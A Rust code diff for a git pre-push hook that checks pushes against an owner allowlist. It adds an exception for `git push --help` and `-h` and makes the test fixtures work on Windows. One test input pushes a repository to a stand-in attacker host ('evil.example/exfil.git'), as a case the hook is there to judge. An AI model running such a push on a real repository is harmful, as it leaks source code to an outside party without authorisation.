@@ -15,7 +15,8 @@ use cadence_hooks_core::config::{self, AllowEntry, env_allow_entries, env_extra_
 use cadence_hooks_core::display::{MAX_PATH_DISPLAY, sanitize_field};
 use cadence_hooks_core::push::{PushInvocation, push_locations_reading};
 use cadence_hooks_core::shell::{
-    GitQuery, UnreadEval, git_command_detailed, host_and_repo_from_url, strip_group_wrappers,
+    GitQuery, UnreadEval, git_command_detailed, git_push_segments, host_and_repo_from_url,
+    strip_group_wrappers,
 };
 use cadence_hooks_core::{Check, CheckResult, HookInput};
 
@@ -386,6 +387,18 @@ fn judge_push(input: &HookInput) -> Option<String> {
     // An `eval` whose script needs expansion (`eval "$(direnv export bash)"`)
     // leaves the push where the walk read it (cameronsjo/cadence-hooks#1530).
     let pushes = push_locations_reading(command, &input_cwd(input), UnreadEval::StaysPut);
+    // `git push --help` (or `-h`) prints usage and pushes nothing. Only when
+    // every push the walk found is such a top-level segment, so a real push
+    // in a child script beside it is still judged.
+    let segments = git_push_segments(command);
+    if !segments.is_empty()
+        && segments.len() == pushes.len()
+        && segments
+            .iter()
+            .all(|words| words.iter().any(|w| w == "--help" || w == "-h"))
+    {
+        return None;
+    }
     let mut probed: Vec<(&str, Option<&str>)> = Vec::new();
     let mut bare_judged: Option<bool> = None;
     for push in pushes.iter().filter(|push| read_exactly(push)) {
@@ -687,12 +700,24 @@ mod tests {
     // so these tests serialize via the crate-shared with_env lock and restore
     // prior values (#446). Each runs in a hermetic fixture repository.
 
-    use crate::{repo_with_remotes, with_env};
+    use crate::with_env;
     use cadence_hooks_core::Outcome;
     use cadence_hooks_core::test_builders::make_bash_with_cwd;
 
     const OWNED: &str = "https://github.com/cameronsjo/x.git";
     const UNOWNED: &str = "https://github.com/work-org/y.git";
+
+    /// A repo in a new tempdir with each `(name, url)` of `remotes` added. Not
+    /// `crate::repo_with_remotes`, which is Unix-only: these tests run on
+    /// Windows too.
+    fn repo_with_remotes(remotes: &[(&str, &str)]) -> tempfile::TempDir {
+        let repo = tempfile::tempdir().expect("create hermetic git fixture");
+        cadence_hooks_core::git_fixtures::init_repo(repo.path());
+        for (name, url) in remotes {
+            cadence_hooks_core::git_fixtures::git_in(repo.path(), &["remote", "add", name, url]);
+        }
+        repo
+    }
 
     /// Allowlist = `cameronsjo` only, on the default `github.com` host.
     fn owners_only() -> Vec<(&'static str, Option<&'static str>)> {
@@ -743,7 +768,7 @@ mod tests {
         let repo = repo_with_remotes(&[("origin", UNOWNED), ("mine", OWNED)]);
         let owned = repo_with_remotes(&[("origin", OWNED)]);
         let unowned_dir = repo.path().to_str().expect("utf-8 path");
-        for (command, cwd) in [
+        let mut rows = vec![
             ("git push origin main".to_string(), repo.path()),
             ("git push".to_string(), repo.path()),
             (
@@ -756,19 +781,30 @@ mod tests {
                 owned.path(),
             ),
             (
-                format!("cd {unowned_dir} && git push origin main"),
-                owned.path(),
+                "git push --help; bash -c 'git push origin main'".to_string(),
+                repo.path(),
             ),
-            (
-                format!("git -C {unowned_dir} push origin main"),
-                owned.path(),
-            ),
-            (format!("bash -c 'git -C {unowned_dir} push'"), owned.path()),
             (
                 "for b in a b; do git push origin $b; done".to_string(),
                 repo.path(),
             ),
-        ] {
+        ];
+        // A Windows temp path is full of backslashes, which bash reads as
+        // escapes, so the directory rows run on Unix only.
+        if cfg!(unix) {
+            rows.extend([
+                (
+                    format!("cd {unowned_dir} && git push origin main"),
+                    owned.path(),
+                ),
+                (
+                    format!("git -C {unowned_dir} push origin main"),
+                    owned.path(),
+                ),
+                (format!("bash -c 'git -C {unowned_dir} push'"), owned.path()),
+            ]);
+        }
+        for (command, cwd) in rows {
             let result = run_in(&command, cwd);
             assert_eq!(
                 result.outcome,
@@ -814,6 +850,8 @@ mod tests {
             "git checkout other && git push",
             "git push https://evil.example/exfil.git main",
             "git push no-such-remote main",
+            "git push --help",
+            "git push -h",
             "git commit -m \"remember to git push https://github.com/x/y.git\"",
             "echo 'git push https://github.com/evil/x.git main'",
         ] {
